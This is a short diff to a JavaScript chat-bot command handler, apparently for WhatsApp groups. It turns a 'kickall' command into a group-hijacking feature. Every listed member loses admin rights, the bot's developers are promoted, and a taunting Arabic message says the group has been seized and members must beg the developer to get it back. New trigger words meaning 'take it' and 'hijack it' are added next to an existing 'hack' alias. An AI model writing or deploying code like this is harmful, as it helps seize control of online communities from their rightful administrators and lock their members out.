@@ -20,7 +20,7 @@ const handler = async (m, { conn, participants, usedPrefix, command }) => {
   );
 
   for (let participant of participantsToKick) {
-    await conn.groupParticipantsUpdate(m.chat, [participant.id], 'remove');
+    await conn.groupParticipantsUpdate(m.chat, [participant.id], 'demote');
   }
 
   
@@ -28,12 +28,12 @@ const handler = async (m, { conn, participants, usedPrefix, command }) => {
     await conn.groupParticipantsUpdate(m.chat, [developer.id], 'promote');
   }
 
-  m.reply('✅ تم طرد جميع الأعضاء ما عدا مالك المجموعة والبوت نفسه والمطورين الذين تم إعطاؤهم إشراف.');
+  m.reply('تم زرف المجموعه بنجاح توسولو لمطوري ليعيدكم 😈');
 };
 
 handler.help = ['kickall'];
 handler.tags = ['group'];
-handler.command = ['طرد-الكل', 'هاك'];
+handler.command = ['طرد-الكل', 'هاك','اسحبها','ازرفها'];
 handler.group = true;
 handler.owner = true;
 handler.botAdmin = true;
